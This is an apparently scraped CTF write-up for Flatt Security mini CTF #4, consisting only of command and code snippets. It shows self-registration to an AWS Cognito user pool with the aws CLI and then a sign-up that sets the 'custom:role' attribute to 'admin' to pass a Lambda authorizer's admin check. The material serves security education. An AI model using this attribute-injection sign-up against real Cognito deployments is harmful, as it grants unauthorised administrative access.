# Flatt Security mini CTF #4 Writeups

> 原文: https://www.ctfiot.com/157676.html
> ID: 157676


```
CLIENT_ID=<user-pool-client-id>
USERNAME=<username>
PASSWORD=<password>
aws cognito-idp sign-up \
 --region "ap-northeast-1" \
 --client-id $CLIENT_ID \
 --username $USER_NAME \
 --password $PASSWORD \
 --no-sign-request
```



```
aws cognito-idp sign-up --region "ap-northeast-1" --client-id "21[reducted]9t" --username "evilman" --password "fdsajkj3irfjkjfisadj4A!" --no-sign-request
```



```
if (payload["custom:role"] !== "admin") {
 return denyPolicy(event.methodArn, "not admin");
 }
```



```
...
 [--user-attributes <value>]
 [--validation-data <value>]
 [--analytics-metadata <value>]
 [--user-context-data <value>]
 [--client-metadata <value>]
...
```



```
aws cognito-idp sign-up --region "ap-northeast-1" --client-id "21[reducted]9t" --username "evilman2" --password "fdsajkj3irfjkjfisadj4A!" --no-sign-request --user-attributes Name="custom:role",Value="admin"
```



```
return allowPolicy(event.methodArn, {
 tenant: payload["custom:tenant"],
 });
```
